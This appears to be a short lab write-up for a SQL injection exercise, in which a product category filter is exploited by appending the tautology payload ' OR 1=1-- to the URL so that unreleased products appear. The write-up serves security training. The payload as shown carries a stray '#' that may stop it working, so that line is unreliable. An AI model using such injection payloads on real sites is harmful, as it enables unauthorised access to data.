## Challenge
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application executes a SQL query similar to the following:
```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To solve the challenge, perform a SQL injection attack that will cause the application to display one or more unreleased products.
## Solution
Go to the website page

Select any category and look at the `URL` of the page
![[Pasted image 20241130140700.png]]
```URL
https://web-security-academy.net/filter?category=Accessories
```
To display all products, you need to supplement the `URL` like this:
```URL
https://web-security-academy.net/filter?category=Accessories# ' OR 1=1--
```
